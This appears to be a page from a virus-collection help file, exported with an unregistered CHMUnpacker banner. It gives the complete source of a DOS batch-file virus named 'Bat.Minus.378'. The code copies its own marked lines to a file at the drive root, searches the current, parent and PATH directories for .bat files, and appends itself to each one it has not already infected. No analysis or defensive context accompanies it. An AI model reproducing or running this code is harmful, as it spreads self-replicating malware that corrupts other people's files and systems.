================================================================================
<br>This file has been exported by unregistered version of CHMUnpacker.
<br>This message is not appear on files exported by a registered version of CHMUnpacker.
<br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
<br>================================================================================
<br>
<br>
<br>
<br>Bat.Minus.378 by ?


@echo off%!-%
if '%1=='~ goto !-%2
if exist \!-.bat goto !-r
if not exist %0.bat goto !-e
find "!-"<%0.bat>\!-.BAT
:!-r
command /c \!- ~ s . .. %path%
goto !-e
:!-s
shift%!-%
if '%2==' exist !-
for %%a in (%2\*.bat) do call \!- ~ i %%a
goto !-s
:!-i
find "!-"<%3>!-s
copy !-s !-!>nul
if exist !-! goto !-a
del !-s
type \!-.bat>>%3
exit !-
:!-a
del !-!
:!-e